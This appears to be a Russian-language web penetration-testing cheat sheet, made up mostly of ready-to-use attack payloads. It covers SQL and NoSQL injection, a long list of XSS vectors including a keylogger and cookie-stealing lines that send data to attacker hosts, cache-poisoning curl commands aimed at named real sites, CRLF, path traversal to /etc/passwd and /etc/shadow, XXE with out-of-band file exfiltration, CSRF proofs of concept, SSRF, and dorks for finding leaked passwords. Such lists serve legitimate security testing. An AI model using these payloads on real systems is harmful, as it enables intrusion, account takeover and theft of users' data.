**SQL**
```
a - (Строковой входящий параметр) 
php?id=1'
php?id=1' —

b - (Числовой входящий параметр)
php?id=1 blablabla
php?id=-1

c - (Авторизация)
Под ником 'Admin' нам нужно вписать вместо него что то наподобие этого Admin' — 
Уязвимость в поле 'pass'
123' OR login='Admin' — 

d - (Оператор LIKE)
Вместо пароля просто ввести "%"


or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
SLEEP(1) /*‘ or SLEEP(1) or ‘“ or SLEEP(1) or “*/SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),​SLEEP(1)))OR"*/ FROM some_table WHERE ex = ample
Cookie - со странными именами, orange и squeeze(страница входа), 

1'=sleep(10)='1 
Для определения версии базы данных:

'= IF (MID (версия (), 1,1) = 1, SLEEP (10), 0) =' 1
'= IF (MID (версия (), 1,1) = 5, СНА (10), 0) =' 1
Для сжатия файла cookie:

Начальная полезная нагрузка для определения проблемы
1 'или true #
1 'или false #

postType='OR(if(now()=sysdate(),sleep(13),0))OR'"+--+
```

**NoSQL  injection**
```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
```

**XSS**

```
,./;'[]\-=
<>?:"{}|_+
!@#$%^&*()`~
'":;<>/\[]<script><h1>
''`;!--"<XSS>=&{()}

Html Entities
< - &lt;
> - &gt;
& - &amp;
" - &quot;
' - &#039;

<     %3C
>     %3E
#     %23
%     %25
{     %7B
}     %7D
|     %7C
\     %5C
^     %5E
~     %7E
[     %5B
]     %5D
`     %60
;     %3B
/     %2F
?     %3F
:     %3A
@     %40
=     %3D
&     %26
$     %24
+     %2B
"     %22
space %20

У JS есть доступ:
localStorage.get('session_key')
sessionStorage
cookie
есть доступ к любым http ответам с этого же Origin

let xhr = new XMLHttpRequest();
xhr.open('GET', '/page-b.html');
xhr.send();
xhr.onload = function() {
    if (xhr.status != 200) {
    } else {
      console.log(xhr.responseText);
    }
  };
  
верхний код иначе
<img src onerror='
onkeypress=
(e)=>{fetch("//evil?k="+String.fromCharCode(e.which))}
,this.remove()
'>

document.write() => document.documentElement.innerHTML='' => document.body.innerHTML=''
  
Для разграничения доступа js между разными сайтами используется Origin
Origin = protocol + hostname + port

SOP - Same-Origin-Policy - фундаментальная защита которая используется в вебе
JS, выполняемый на Origin https://site.ru:443 не может получить доступ к содержимому следующих Origin:
https://google.com:443
https://site.com:443
ftp://site.ru:443
https://site.ru:444
https://my.site.ru:443

Обходы SOP (CORS, WebSocet, PostMessage, JSONP, Flash)
Куки, поставленные на одном порту можно прочитать на любом другом порту

FOR S3 backet
serviceworker.js
self.addEventListener('fetch', function(event) {
  event.respondWith(
    new Response (
      new Blob (
        ["<iframe src='https://mysite.ru'",
        ""]
        {type:'text/html'}))
    );
  });
  
exploit.html
<body>
<script>navigator.serviceWorker.register(
        '/serviceworker_...&X-Amz-Signature=...',
        {scope:'/'}
</script>
</body>

Закрываем следующие тэги
<iframe>
<noembed>
<noscript>
<style>
<xmp>
<script>
<noframes>
<textarea>
<title>
<plaintext>
<template>
<frameset>

</noscript></style></scrip>....

<img src onerror=alert()> - <img/src/onerror=alert()>
<svg onload=alert()>


document.body.innerHTML+="<img src onerror=alert('img')>"

Основные методы вызова javascript из html

<script>...</script>
<img onerror="..." src="x">test</a> - обработчик событий
<a href="javascript:...">click to trigger javascript</> - через ссылки
<iframe src="javascript:..." - через  iframe

<script>...</script> - БД - Html template DB call - DOM(user's browser) - <script>...</script>

xss между тэгами разметки
<script>alert(5)</script>

xss внутри значения аттрибута
"><script>alert(5)</script>

xss между специфичных тэгов (title / style / noscript / textarea)
"></title><script>alert(5)</script>

xss внутри тега script
"></script></title><script>alert(5)</script>
";+alert();//
;alert()

xss особенности HTML (одинарное / двойные кавычки)
'"></script></title><script>alert(5)</script>

xss внутри значения аттрибута
'%20autofocus%20onfocus='alert(); - onfocus не будет работать если у тэга input есть аттрибут type=hidden
' " onfocus='alert()' autofocus

xss внутри ссылки (гиперссылки / редиректы(?returnUrl=...))
<a href="javascript:alert(1)">
<a href="javascript://site.com/%0aalert()">Back</a>
javascript: = &#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&colon;//site.com/%0aalert()
%20javascript:alert(1)
%09javascript:alert(1)

iframe + обработчик (iframe - используется для того чтобы отобразить страницу внутри другой страницы), alert``
'"></title></script><iframe onload='alert``'>
<iframe srcdoc="&#x3C;script&#x3E;alert()&#x3C;/script&#x3E;">
'"></title/</script/</style/><iframe/onload='alert``'>
<iframe src="data:text/html,<script>alert(location.origin)</script>"></iframe>

Пробелы между аттрибутами в тэге могут заменить слэшем
<iframe/onload='alert()' - необязательно закрывать тэг

xss попадает внутрь комментария
'"></title/</script/</style/--><iframe/onload='alert``'>

xss AngularJS/VueJs (F12 - Console - angular.version)
{{7*7}}
{{constractor.constractor('alert()')()}}

Универсальная нагрузка
'"/test/></title/</script/</style/-->{{7*7}}<iframe/onload='alert``'<!--

Добавить код через расширение
if(document.querySelectorAll('*[test]').length>0){
prompt('XSS');
}

xss + base64, Regexp + base64

Regexp
document.cookie == document['cookie']
document['location']=javascript:alert()

Email template's html injection (server-side-template-injection) (${} #{}, обратить внимание на шаблонизаторы)
Вставка html тэгов в шаблон письма - --></script><a href="//site.com">GO</a><img src=x>${7*7}{{7*7}}<!--
<a href=//test> => http://test

NULL <scri%00pt>alert()</scri%00pt>

TAB <svg+src="jav%09ascript:alert(1)">

Newline <script>//>%0Aalert(1);</script>

Carriage Return <script>//>%0Dalert(1);</script>

Spaces < s c r i p t > p r o m t ( 1 ) < / s c r i p t >

<link rel='stylesheet' href='/a' onerror='alert()'>

/#text= NAME'); alert(document.cookie+'

reflected XSS - /?report=javascript
%3aalert(document.domain)

/login?" onmouseover="alert(document.domain)"

"<svg/onload=alert(document.domain)

php?email='-alert(document.domain)-'

<script>\u0061\u006C\u0065\u0072\u0074(I)</script>

<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />

"><img src=x onerror=prompt(1);>

"><img src=x onerror=alert(document.domain)>

<script>a="get";b="URL";c="javascript:";d="alert(1);";eval(a+b+c+d);</script>

<form action="javascript:alert(document.location);"><input type="submit" /></form>

<iframe src="//www.youtube.com/embed/Ik9fCVkKeLg" frameborder="0" style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">

<div style="background:url('javascript:alert(1)')">

input[name=csrf_token][value=^a]{background-image:url('http://attack.com/log.php?a');}

mobile-phones-tablets/ph-'*alert(1)*'%3E%3Cimg%20src=x%3Easdf?q=qwerty

";alert(1)//535"

"{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"

XSS с помощью css:
  <style>img{background-image:url('javascript:alert(1)')}</style>

Обход фаерволов:
  <style>*{background-image:url('\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29')}</style>

Polyglot XSS - Mathias Karlsson
  " onclick=alert(document.cookie)//<button ‘ onclick=alert(document.cookie)//> */ alert(1)//

В название файла
  "><svg onload=alert(document.domain)>.png - в название файла name, filename(filename="test.<img src=a onerror=alert(1)>")
Дополнительно к картинке можно изменить
  Content-Type: image/jpeg на Content-Type: text/html
  "><svg onload=alert(1)>.jpg
  
В Chrome и Safari достаточно использовать функцию import. Например
<img src onerror=import('//bo0om.ru/x/')>
 Для ответа у нашего скрипта должен быть настроен CORS, но в этом никакой проблемы нет.

"><img src=x onerror=prompt(document.domain)>

"/><svg/onload=alert(document.cookie);> 

<svg><discard onbegin=alert(1)>

#<img/src="1"/onerror=alert(1)>

DOM
  /download#"><img src=x onerror=prompt(/xss/);>
  html#<script>alert(1);</script>
  ?section_type=xss'+prompt(1)+'
  .html?error=Invalid image file"><img src=x onerror=alert(1)>
  "onmouseover="alert(1)&#x2f; &#x2f; - поместите заголовок в качестве поискового запроса в URL-адрес
  /frame#1' onerror='alert("1")'>
  /var=');alert('1
  signup?next=javascript%3Aalert%28%27xss%27%29
  /frame#data:text/plain,alert('1')
  
Через proxy вместо годного url вставить script (json)
  "url": "javascript:alert(1)"

"Share" button add: 
  "><svg/onload=confirm(1)>

Change the logo link
  javascripT://https://google.com%0aalert(1);//https://google.com
  javascripT%3A%2F%2Fhttps%3A%2F%2Fgoogle.com%250aalert(document.domain)%3B%2F%2Fhttps%3A%2F%2Fgoogle.com

Mobile version
  " ontouchstart="alert(1)

Greedy XSS Regex filter
  <%0crameset%20src=''>

Изменить имя <img src="//domain.xyz/xss.swf"> 
КОД для swf расширение xss.as
  package {
   import flash.display.*;
   import flash.external.ExternalInterface;
   public class xss extends Sprite {
     public function xss() {
       ExternalInterface.call("alert(document.domain)");
     }
   }
  }
  
Blind stored XSS
  "><script src=https://x.com></script>
  
Reflective XSS
  </script><svg><script>/<@/>alert(1337)</script>  
  
XSS, через base64
  <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=">hack</a>
  
XSS - Generic(пользователь может передать в качестве префикса вектора атаки пару \', пройдя через механизм экранирования, пара примет вид \\', следовательно, одинарная кавычка потеряет статус экранирования)
  #/')+alert(document.domain)//

XSS(через загрузку json)
 ”data”: {
 ”name”: ”#”><img src=/ onerror=alert(1)>”,
 ”type”: ”AUTO_EVENT_VAR”,
 ”autoEventVarMacro”: {
 ”varType”: ”HISTORY_NEW_URL_FRAGMENT”

 }
}

XSS reflected через заголовок http Referer
  Referer: http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5

Перехват нажатий и подмена интерфейса
  <a href="http://attacker.org"><iframe src="http://example.org/"></iframe></a>

В поле формы, предназначенное для названия изображения
  Было - Content-Disposition: form-data; name=”properties[Artwork file]”
  Стало - Content-Disposition: form-data; name=”properties[Artwor k file<img src=’test’ onmouseover=’alert(2)’>]”;

В поле поиска
  "><SCRIPT>var+img=new+Image();img.src="http://attack/"%20+%20document.cookie;</SCRIPT>
  q=qwerty+%3Cscript%3Eevil_script()%3C/script%3E
  
При отписке
unsubscribed?email=email@gmail.com'"><svg/onload=alert(document.domain)>
unsubscribed?email=email@gmail.com%27%22%3E%3Csvg/onload=alert(document.domain)%3E

XSS через CSRF
<html>
<body onload='document.forms[0].submit()'>
  <form method='POST' enctype='application/json' action='https://api.imgur.com/3/folders'>
    <input name='name' value='New Test"><img src=x onerror=prompt(1)>'>
    <input name='is_private' value='false'>
  </form>
</body>
</html>
  
Прочее
  $(sleep 20)<script>alert(1)</script> "> <img src="x" onerror=promt(1);>
  в IIS возможно создать XSS payload не только в форматах типа html/xml? Оказывается, что вектор для XML <a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(1337)</a:script> может быть загружен со следующими расширенями: .dtd .mno .vml .xsl .xht .svg .xml .xsd .xsf .svgz .xslt .wsdl .xhtml, а вектор <script>alert(1337)</script> будет работать в форматах .cer .hxt и .htm
  
Stored XSS, используя специфическую для Wiki иерархическую ссылку Markdown на страницах Wiki.
Title: javascript:
Format: Markdown
Content: [XSS](.alert(1);)

XSS через заголовок
Связать отравление кэша с сохраненным XSS. Создать уникальный ключ и добавил стиль заголовка с полезной нагрузкой XSS и запустить запрос. www.redacted.com/?q=admin&liec4897=1
style: dsfsdfsdfsdf"><script>alert(9)</script><!--

ANGULAR
?q=wrtz{{(_="".sub).call.call({}[$="constructor"].getOwnPropertyDescriptor(_.__proto__,$).value,0,"alert(1)")()}}zzzz

WAF
oalertnfocus=alalertert(documealertnt.cookie) autofocus
  
```

**Practical Web Cache Poisoning**
```
Что более разумно и распространено для кеширования - это статические, общедоступные файлы: таблицы стилей (css), скрипты (js), текстовые файлы (txt), изображения (png, bmp, gif) и т.д.

Что происходит при доступе к URL-адресу, например http://www.example.com/home.php/non-existent.css?

В зависимости от технологии и конфигурации (для разных серверов структура URL может потребоваться несколько отличаться), сервер возвращает содержимое http://www.example.com/home.php. И да, URL остается http://www.example.com/home.php/non-existent.css. Заголовки HTTP будут такими же, как и для прямого доступа к http://www.example.com/home.php: те же заголовки кэширования и тот же тип контента

Steps To Reproduce:
Login to your account.
Go to https://chaturbate.com/my_collection/.
Then after go to https://chaturbate.com/my_collection/min.js.
Open private mode (Incognito window) or Any other browser and paste https://chaturbate.com/my_collection/min.js url in address bar.

Через curl
url=https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=$(date +%s) && curl -i -s -k -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $url | fgrep portswigger && echo -e "\n\n$url"

An attacker can easily poison the cache in arbitrary regions by using a service like https://www.nexcess.net/resources/tools/global-dns-checker/?h=catalog.data.gov&t=A to get a list of CloudFront's frontends in different regions, then routing the attack through each of those in turn:

curl --resolve catalog.data.gov:443:54.230.9.199 -H $'x-forwarded-host: portswigger-labs.net/'


An attacker can persistently block access to any/all redirects on www.hackerone.com by using cache poisoning with the X-Forwarded-Port or X-Forwarded-Host headers to redirect users to an invalid port.

curl -H 'X-Forwarded-Port: 123' https://www.hackerone.com/index.php?dontpoisoneveryone=1

This attack can also be done using the X-Forwarded-Host header:
curl -H 'X-Forwarded-Host: www.hackerone.com:123' https://www.hackerone.com/index.php?dontpoisoneveryone=1

```

**Authentication bypass**
```
В процессе аутентификации при доступе к веб-сайту, посетив ссылку для отмены подписки.
PHPSESSID=xxx;
```
**Open redirect**
```
?url=
?to=
?go=
?ReturnUrl=
?return_to=
?domain_name=
?checkout_url=
?redirect_to=
?hostname=

=//www.facebook.com
=https://facebook.com
=/..//facebook.com

index.php?go=javascript:alert(document.domain)
?page=javascript:alert(document.location)

edit?image=http://securityidiots.com?vimeocdn.com/.png - ссылалось на сайт vimeocdn.com с любым разрешением

<iframe src="https://.../..html> - ..html -  содержит код

<!DOCTYPE html>
...
...
<body>
<script>top.window.location = "https://evil.com";<script>
</body>

**Link filter protection bypass**
Usage: ?url=//google。com
Goes to: https://google.com
URL encoded: %E3%80%82
?url=google%E3%80%82com
```

**CRLF(Carriage Return Line Feed)**
```
GET /qwerty%0ASet-Cookie:%20test=qwerty;domain=.beepcar.ru HTTP/1.1

\r\n
0X0A
%0D%0A
%E5%98%8A
%E5%98%8A% E5%98%8D
login?redirect_after_login=https://twitter.com:21/%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE

Примечание обхода %E5%E98%8A => U+560A => 0A

%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>deface</html>
В этом случае %20 является пробелом, а %0d%0a - CRLF.

Login?hl=%0D%0A[B]fakeheader[/B]&amp;null=Go%20HTTP/1.1
```

**robots.txt**
```
Disallow - Запрет доступа всех роботов 
Allow - Разрешает доступ к определенной части ресурса
```

**google dork**
```
https://www.exploit-db.com/google-hacking-database
https://www.youtube.com/watch?v=d3NzsrmVrlw
https://www.blackhat.com/presentations/bh-europe-05/BH_EU_05-Long.pdf

cache: this dork will show you the cached version of any website, e.g. cache: securitytrails.com
allintext: searches for specific text contained on any web page, e.g. allintext: hacking tools
allintitle: exactly the same as allintext, but will show pages that contain titles with X characters, e.g. allintitle:"Security Companies"
allinurl: it can be used to fetch results whose URL contains all the specified characters, e.g: allinurl client area
filetype: used to search for any kind of file extensions, for example, if you want to search for jpg files you can use: filetype: jpg
inurl: this is exactly the same as allinurl, but it is only useful for one single keyword, e.g. inurl: admin
intitle: used to search for various keywords inside the title, for example, intitle:security tools will search for titles beginning with “security” but “tools” can be somewhere else in the page.
inanchor: this is useful when you need to search for an exact anchor text used on any links, e.g. inanchor:"cyber security"
intext: useful to locate pages that contain certain characters or strings inside their text, e.g. intext:"safe internet"
link: will show the list of web pages that have links to the specified URL, e.g. link: microsoft.com
site: will show you the full list of all indexed URLs for the specified domain and subdomain, e.g. site:securitytrails.com
*: wildcard used to search pages that contain “anything” before your word, e.g. how to * a website, will return “how to…” design/create/hack, etc… “a website”.
|: this is a logical operator, e.g. "security" "tips" will show all the sites which contain “security” or “tips,” or both words.
+: used to concatenate words, useful to detect pages that use more than one specific key, e.g. security + trails
–: minus operator is used to avoiding showing results that contain certain words, e.g. security -trails will show pages that use “security” in their text, but not those that have the word “trails.”

«site:trello.com AND intext:@gmail\.com AND intext:password»
allintext:username filetype:log
inurl:/proc/self/cwd

```

**Clickjacking**
```
Примечание:
Нет X-FRAME-OPTIONS, установленных в DENY или SAMEORIGIN, то они уязвимы для clickjacking

Выполните приведенный ниже код из браузера, и вы увидите, что перечисленные ссылки уязвимы для атаки с помощью кликов

<!DOCTYPE html> 
<html>
<frameset cols="25%,*,25%">
<frame src="https://www.semrush.com/?l=us">
<frame src="https://www.semrush.com/academy/">
<frame src="https://www.semrush.com/ranking-factors/">
<frame src="https://www.semrush.com/semrush-opensearch.xml">
</frameset>
</html>

По шагам
1. open notepad and paste the following code
<html>
<head>
<title>Clickjack test page</title>
</head>
<body>
<p>Website is vulnerable to clickjacking!</p>
<iframe src="https://semrush.com/" width="1247" height="800"></iframe>
</body>
</html>

2. save it as <anyname>.html eg s.html
3. and just simply open that..
```

**LFI**
```
/index.php?file=/../../../../../../../../../etc/passwd 

=../../../../../../../../../../../../../etc/passwd%00 

/anysome/vip/css/..\..\..\..\..\..\..\..\..\etc\passwd 

file=/../../../../../../etc/passwd.php%00 

file=/../../../../../../etc/passwd%00.php 

index.txt при условии, что приписывается окончание .php 
index.txt/././././../...«(100-10)/2 раз».../././ 

php://filter/convert.base64-encode/resource=index 
http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index

Поиск файла с паролями в следующих местах:
■ /etc/security/passwd
■ /tcb/auth/files/
■ <first letter of username>/<username>
■ /tcb/files/auth/?/
■ /etc/master.passwd
■ /etc/shadow
■ /etc/tcb/aa/user/
■ /.secure/etc/passwd
■ /etc/passwd[.dir|.pag]
■ /etc/security/passwd.adjunct
■ ##username
■ <optional NIS+ private secure maps/tables/whatever>
■ /etc/security/* database
■ /etc/auth[.dir|.pag]
■ /etc/udb
../../../../../../../../../../../etc/passwd%00 ;(etc/rc, etc/rc.local, etc/ssh/ssh_config)
../../../../../../../../../../../etc/hosts ;(proc/cpuinfo, proc/meminfo)

*php wrappers:*

index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
page=php://filter/convert.base64-encode/resource=index.php
page=file:///hidden_code.txt

Лучший способ проверить отдает он /etc/passwd или нет - это выполнить этот запрос и поискать в HTML-коде ответа имя существующего пользователя, например root

Ниже приведён пример записи /etc/passwd:
root:x:0:0:root:/root:/bin/bash
Эта строка показывает, что пользователь root имеет скрытый пароль, а также, что его коды UID и GID равны 0. В качестве домашнего каталога root использует каталог /root/, а в качестве оболочки — /bin/bash.

За дополнительными сведениями о /etc/passwd, обратитесь к странице man passwd(5).

Ниже приведён пример строки файла /etc/shadow:
juan:$1$.QKDPc5E$SWlkjRWexrXYgc98F.:12825:0:90:5:30:13096:
Эта строка содержит следующие сведения о пользователе juan:

Его пароль был в последний раз изменён 11 февраля 2005 г.
Срок, в течение которого нельзя изменить пароль, не определён
Пароль должен меняться каждые 90 дней
Пользователь будет получать предупреждение о необходимости его сменить в течение 5 дней
Учётная запись будет отключена через 30 дней после истечения срока действия пароля, если не будет попыток входа в систему
Срок учётной записи истекает 9 ноября 2005 г.
За дополнительной информацией о файле /etc/shadow обратитесь к странице man shadow(5).

Ниже приведён пример строки файла /etc/group:
general:x:502:juan,shelley,bob
Эта строка показывает, что у группы general есть скрытый пароль, её код GID равен 502, а её членами являются juan, shelley и bob.

За дополнительными сведениями о /etc/group обратитесь к странице man group(5).

Ниже приведён пример строки файла /etc/gshadow:
general:!!:shelley:juan,bob
Эта строка показывает, что для группы general не задан пароль, и не её члены не могут войти в эту группу с помощью команды newgrp. Кроме этого, администратором группы является shelley, а juan и bob — обычные, непривилегированные пользователи.

Так как при редактировании этих файлов можно допустить синтаксические ошибки, для управления пользователями и группами рекомендуется использовать специальные приложения, имеющиеся в Red Hat Enterprise Linux. В следующем разделе рассматриваются основные средства для выполнения этих задач.

```

**XXE(XML External Entity)**
```
Атака, направленная на приложение, которое обрабатывает парсит XML код. 
Возможные форматы XML, DOCX, XLSX..
Стандартом определены два уровня правильности документа XML:

Правильно построенный (well-formed) документ. Такой документ соответствует общим правилам синтаксиса XML, применимым к любому XML-документу. И если, например, начальный тег не имеет соответствующего ему конечного тега, то это неправильно построенный XML.
Действительный (valid) документ. Действительный документ дополнительно соответствует некоторым семантическим правилам. Это более строгая проверка корректности документа на соответствие заранее определенным, но уже внешним правилам. Эти правила описывают структуру документа: допустимые названия элементов, их последовательность, названия атрибутов, их тип и тому подобное. Обычно такие правила хранятся в отдельных файлах специального формата — схемах.
Основные форматы определения правил валидности XML-документов — это DTD (Document Type Definition) и XML Schema. Остановимся на DTD. Стандартом предусмотрено два варианта связывания документа с его схемой: либо через ссылку на схему в заголовке XML-документа (этот заголовок называется Document Type Declaration):

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order SYSTEM "order.dtd">
<order>
<product>1234</product>
<count>1</count>
</order>

либо через описание схемы в документе inline (аналогия: подключение CSS через ссылку или inline):

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE order [
<!ELEMENT count (#PCDATA)>
<!ELEMENT product (#PCDATA)>
<!ELEMENT order (product, count)>
]>
<order>
<product>1234</product>
<count>1</count>
</order>

   Выделяем два класса использования парсеров: на уровне платформы / стандартных библиотек и на уровне прикладного (своего) кода. Типичный пример использования парсеров на уровне платформы —поддержка протоколов XML-RPC и SOAP, на уровне прикладного кода — реализация обмена данными между приложением и пользователем: импорт, экспорт и так далее.

   Возможность подключения внешних сущностей волнует нас прежде всего в контексте анализа защищенности веб-приложений. Из всего стека протоколов, основанных на XML, нас будут интересовать только популярные: SOAP и XML-RPC.

   Что бы мы хотели получить в идеале? Конечно, возможность чтения локальных файлов вроде этого:

В HTTP-запрос, в котором на сервер передается XML, вставляем <!ENTITY xxe SYSTEM "file:///etc/passwd">.
В теле XML-документа даем ссылку на сущность — &xxe;.
В ответе получаем содержимое локального файла.
Пример #1:
POST http:example.com/xml HTTP/1.1
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY bar SYSTEM
"file:///etc/lsb-release">
]>
<foo>
&bar;
</foo>

Пример #2:
   Исходный запрос
PUT /rest/import/users?test=1 ... 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?> <list> <user login="Name" fullName="FIO" email="name@lol.su"/> </list>

   Изменив исходный запрос на XXE вектор вида
PUT /rest/import/users?test=1 ... 
<?xml version="1.0"?> <!DOCTYPE list [ <!ENTITY % xxe SYSTEM "http://xxe.yourhost.ru/xxe-test"> %xxe; ]> <list></list>

   К вам на сервер придет запрос:
GET /xxe-test HTTP/1.1 HOST: xxe.yourhost.ru USER_AGENT: Java/1.8.0_45 ACCEPT: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2 CONNECTION: keep-alive

java — даёт нам огромное преимущество!

Фича в эксплуатации XXE в JAVA от ONSEC. Суть исследования в том, что используя протокол FTP можно передавать содержимое файлов, даже если в ответе от сервера информация не передаётся. Ещё один плюс, это особенность java — обращение к директории даёт её листинг.

Создать файл, java.dtd:
<!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://xxe.yourhost.ru/%b;'>">%c;

Слушать 21 порт (FTP), отправить атакующий HTTP-пакет:

PUT /rest/import/users?test=1 ... 
<?xml version="1.0"?> <!DOCTYPE list [ <!ENTITY % b SYSTEM "file:///etc/passwd"> <!ENTITY % asd SYSTEM "http://xxe.yourhost.ru/java.dtd"> %xxe; ]> <list></list>


Часть 0 - Инъекция через JSON/XML-заглушки для API https://xakep.ru/2016/03/23/json-xml-api-xxe/
Часть 1 – What is XML External Entity (XXE)? https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/
Часть 2 – XML External Entity (XXE) limitations https://www.acunetix.com/blog/articles/xml-external-entity-xxe-limitations/
Часть 3 – Out-of-band XML External Entity (OOB-XXE) https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/

Exploiting-xxe-with-local-dtd-files
https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/
```

**CSRF/XSRF(Cross Site Request Forgery)**
```
Благоприятная среда для CSRF

Отсутствие CSRF-токенов.(X-Requested-With, XMLHttpRequest, заголовок X-CSRFToken, Host, Origin, Referer)
Проверка только на фронте, без проверки на стороне сервера.
Включено подтверждение через email.
Токены передаются в URL
Пример сценариев атаки:

Приложение позволяет пользователю отправлять запрос на изменение состояния, который не содержит ничего секретного. Вот так:

    http://example.com/app/transferFunds?amount=1500&destinationAccount=4673243243

Таким образом, злоумышленник строит запрос, который переводит деньги со счета жертвы на свою учетную запись, а затем вводит эту атаку в запрос изображения или iframe, хранящийся на разных сайтах под контролем атакующего.

    <img src = "http://example.com/app/transferFunds?amount=1500&destinationAccount=attackersAcct#" width = "0" height = "0" />

Если жертва посещает какой-либо из этих сайтов, хотя уже прошел проверку подлинности на example.com, любые поддельные запросы будут включать информацию о сеансе пользователя, непреднамеренно разрешающую запрос.

<form action="http://mail.com/send" method="POST">
  <input type="hidden" name="csrf" value="salt + ":" + MD5(salt + ":" + secret)">
  <input type='hidden' name='csrfmiddlewaretoken' value='django'
  <textarea name="message">
    ...
  </textarea>
  <input type=submit>
</form>

CSRF to XSS 

<html>
  <body>
    <form action="https://www.teavana.com/on/demandware.store/Sites-Teavana-Site/default/Wishlist-Comments/:id" method="POST">
      <input type="hidden" name="wishlistComment" value="&lt;&#47;textarea&gt;&lt;img&#32;src&#61;x&#32;onerror&#61;alert&#40;1&#41;&gt;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

Еще пример:
<!doctype html>
<html>
    <head>
    </head> 
<body>
    <script>
        var a = window.open("https://app.mavenlink.com/project_templates#new", "csrf", "height=100,width=100"); 
        var intervalID = setTimeout(function () { a.close();}, 30000); 
    </script>
</body>
</html>

Еще пример:(Все конечные точки API (v1 и v2) отражают session_id для ответа Set-Cookie - что может привести жертву к учетной записи злоумышленника)
<!doctype html>
<html>
    <head>
    </head> 
<body>
    <form action="https://unikrn.com/apiv1/" method="POST">
        <input type="hidden" name="session_id" id="session_id" value="cm8csktf7p485hmb7on32o5bm94nm71i"> <!-- attacker session_id -->
        <input type="submit"">
    </form>
</body>
</html>

Еще пример: Create a CSRF login POC using the following code.
<html>
<body>
    <form action="https://unikrn.com/apiv1/login" method="POST">
        <input type="hidden" name="usr" value="[email]">
        <input type="hidden" name="pwd" value="[password]">
        <input type="submit" value="Submit request" />
    </form>
</body>
</html>
```

**SSRF - Server side request forgery**
```
В случае с SSRF жертвой является сам уязвимый сервер, а в случае с CSRF - это браузер пользователя.

• Использование Google Dorking
• %00 - нулевой байт, дополнительные слэши, вопросительный знак.
 ...net/global/media_-preview.php?url=http://ziot.org/?1.png

Например, злоумышленник может получить доступ к службам на локальном хосте. В следующем примере злоумышленник может сделать следующий запрос на HTTP-серверах Apache с включенным mod_status (включен по умолчанию).
    GET /?url=http://localhost/server-status HTTP/1.1
    Host: example.com

